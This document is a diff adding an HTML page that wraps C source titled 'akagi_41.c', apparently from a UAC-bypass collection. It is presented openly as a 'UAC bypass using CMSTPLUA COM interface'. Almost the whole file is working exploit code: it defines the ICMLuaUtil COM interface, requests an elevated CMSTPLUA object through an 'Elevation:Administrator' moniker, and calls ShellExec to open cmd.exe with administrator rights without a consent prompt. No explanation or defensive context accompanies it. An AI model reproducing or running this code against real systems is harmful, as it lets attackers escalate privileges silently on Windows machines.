@@ -1,0 +1,144 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>akagi_41.c</title>
+</head><body>#UAC bypass using CMSTPLUA COM interface<br/>
+typedef interface ICMLuaUtil ICMLuaUtil;<br/>
+<br/>
+typedef struct ICMLuaUtilVtbl {<br/>
+<br/>
+&nbsp; &nbsp; BEGIN_INTERFACE<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *QueryInterface)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __RPC__in REFIID riid,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; _COM_Outptr_ &nbsp;void **ppvObject);<br/>
+<br/>
+&nbsp; &nbsp; ULONG(STDMETHODCALLTYPE *AddRef)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; ULONG(STDMETHODCALLTYPE *Release)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method1)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method2)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method3)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method4)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method5)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method6)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *ShellExec)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; _In_ &nbsp; &nbsp; LPCTSTR lpFile,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; _In_opt_ LPCTSTR lpParameters,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; _In_opt_ LPCTSTR lpDirectory,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; _In_ &nbsp; &nbsp; ULONG fMask,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; _In_ &nbsp; &nbsp; ULONG nShow<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; );<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method8)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method9)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method10)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method11)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method12)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method13)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method14)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method15)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method16)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method17)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method18)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method19)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; HRESULT(STDMETHODCALLTYPE *Method20)(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; __RPC__in ICMLuaUtil * This);<br/>
+<br/>
+&nbsp; &nbsp; END_INTERFACE<br/>
+<br/>
+} *PICMLuaUtilVtbl;<br/>
+<br/>
+interface ICMLuaUtil<br/>
+{<br/>
+&nbsp; &nbsp; CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;<br/>
+};<br/>
+<br/>
+#define T_CLSID_CMSTPLUA L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"<br/>
+#define T_IID_ICMLuaUtil L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"<br/>
+<br/>
+VOID Method41_Test()<br/>
+{<br/>
+&nbsp; &nbsp; HRESULT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;r = E_FAIL;<br/>
+&nbsp; &nbsp; BOOL &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; bCond = FALSE;<br/>
+&nbsp; &nbsp; IID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;xIID_ICMLuaUtil;<br/>
+&nbsp; &nbsp; CLSID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;xCLSID_ICMLuaUtil;<br/>
+&nbsp; &nbsp; ICMLuaUtil &nbsp; &nbsp; &nbsp;*CMLuaUtil = NULL;<br/>
+<br/>
+&nbsp; &nbsp; BIND_OPTS3 &nbsp; &nbsp; &nbsp; bop;<br/>
+&nbsp; &nbsp; WCHAR &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;szElevationMoniker[MAX_PATH];<br/>
+<br/>
+&nbsp; &nbsp; do {<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (CLSIDFromString(T_CLSID_CMSTPLUA, &amp;xCLSID_ICMLuaUtil) != NOERROR) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (IIDFromString(T_IID_ICMLuaUtil, &amp;xIID_ICMLuaUtil) != S_OK) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; RtlSecureZeroMemory(szElevationMoniker, sizeof(szElevationMoniker));<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; _strcpy(szElevationMoniker, L"Elevation:Administrator!new:");<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; _strcat(szElevationMoniker, T_CLSID_CMSTPLUA);<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; RtlSecureZeroMemory(&amp;bop, sizeof(bop));<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; bop.cbStruct = sizeof(bop);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; bop.dwClassContext = CLSCTX_LOCAL_SERVER;<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; r = CoGetObject(szElevationMoniker, (BIND_OPTS *)&amp;bop, &amp;xIID_ICMLuaUtil, &amp;CMLuaUtil);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (r != S_OK) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; r = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, L"C:\\windows\\system32\\cmd.exe", NULL, NULL, SEE_MASK_DEFAULT, SW_SHOW);<br/>
+<br/>
+&nbsp; &nbsp; } while (bCond);<br/>
+<br/>
+&nbsp; &nbsp; if (CMLuaUtil != NULL) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);<br/>
+&nbsp; &nbsp; }<br/>
+<br/>
+}</body></html>
